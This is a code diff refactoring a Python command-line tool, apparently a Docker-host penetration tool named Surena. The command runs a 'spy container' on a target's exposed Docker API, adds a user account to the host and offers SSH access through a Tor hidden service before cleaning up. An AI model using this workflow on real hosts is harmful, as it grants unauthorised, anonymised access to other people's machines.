@@ -1,16 +1,11 @@
 import logging
-import time
-from os.path import join
 
 import click
-from docker import ContainerCollection
-from docker.client import ContainerCollection, ImageCollection
-from docker.errors import APIError
 from pkg_resources import resource_filename
 
-from surena.cli.commons import Ip, Port, required_if_option_has_specific_value
+from surena.cli.options import Port, required_if_option_has_specific_value
 from surena.models.commons import countdown
-from surena.models.docker import DockerClient, SpyContainer
+from surena.models.docker_client import DockerHost, SpyContainer
 from surena.models.ssh import SSHServer
 
 logging.basicConfig(level=logging.INFO)
@@ -22,7 +17,7 @@ SECONDS_OF_LIVE = 300
 logger = logging.getLogger()
 
 
-@click.command("get_docker_host")
+@click.command("get-docker-host")
 @click.option(
     "--docker-host-address",
     required=True,
@@ -85,21 +80,24 @@ def get_docker_host(
     The "get-docker-host" command can show you if your Docker host has
     vulnerabilities due to misconfiguration.
     """
-    docker_client = DockerClient(target_address, target_port)
+    docker_client = DockerHost(target_address, target_port)
 
-    if docker_client.get_operation_system_type().lower() != "linux":
-        raise ValueError("Support only linux as docker host operation system.")
-
-    dockerfile_path = resource_filename(
-        "surena.models.docker",
-        "{}.Dockerfile".format(embedded_image_type),
+    print(
+        'Docker host operation system is "{}".'.format(
+            docker_client.get_docker_host_operation_system_type()
+        )
     )
-    embedded_image_name = docker_client.create_uniq_image_name()
 
-    embedded_image = docker_client.build_image(dockerfile_path, embedded_image_name)
+    ubuntu_dockerfile_path = resource_filename(
+        "surena.models.docker",
+        "ubuntu.Dockerfile",
+    )
+    image_name = docker_client.get_image_unique_name()
+
+    image = docker_client.build_image(ubuntu_dockerfile_path, image_name)
 
     container = docker_client.run_container(
-        embedded_image,
+        image,
         command="/bin/sh",
         detach=True,
         remove=True,
@@ -109,18 +107,18 @@ def get_docker_host(
     )
 
     spy_container = SpyContainer(container)
-    username = spy_container.generate_uniq_username()
+    username = spy_container.generate_docker_host_unique_username()
     password = SpyContainer.generate_random_word()
-    spy_container.add_username_to_host(username, password)
+    spy_container.add_username_to_docker_host(username, password)
 
-    docker_host_free_port = spy_container.get_free_port_on_host()
-    spy_container.add_port_to_service_ssh()
+    docker_host_free_port = spy_container.get_free_port_on_docker_host()
+    # spy_container.add_port_to_service_ssh()
 
     if connection_method == "tor":
-        tor_port = spy_container.get_free_port_on_host()
+        tor_port = spy_container.get_free_port_on_docker_host()
         spy_container.config_service_tor(docker_host_free_port, tor_port)
         spy_container.start_service_tor()
-        spy_container.wait_until_conect_to_tor_network(docker_host_free_port, tor_port)
+        # spy_container.wait_until_conect_to_tor_network(docker_host_free_port, tor_port)
         tor_hostname = spy_container.get_tor_hostname().strip()
         logger.info(
             'Run command "torsocks ssh {}@{} -p {}" to connect to target host with'
@@ -154,23 +152,23 @@ def get_docker_host(
     try:
         countdown(SECONDS_OF_LIVE)
     finally:
-        spy_container.delete_username_from_host(username)
-        if docker_client.remove_container(spy_container):
+        spy_container.delete_username_from_docker_host(username)
+        try:
+            docker_client.remove_container(spy_container)
             logger.info('Surena removed Image "spy container" from Docker Host.')
-        else:
+        except ValueError:
             logger.error("Surena could not remove container from Docker Host.")
 
-        if docker_client.remove_image(docker_client, embedded_image):
+        try: 
+            docker_client.remove_image(image)
             logger.info(
-                'Surena removed Image "{}" from Docker Host.'.format(
-                    embedded_image_name
-                )
+                'Surena removed Image "{}" from Docker Host.'.format(image_name)
             )
-        else:
+        except:
             logger.error(
                 'Surena could not remove Image "{}" from Docker Host.'.format(
-                    embedded_image_name
+                    image_name
                 )
             )
-        docker_client.destroy_containers()
-        docker_client.destroy_images()
+        # docker_client.destroy_containers()
+        # docker_client.destroy_images()
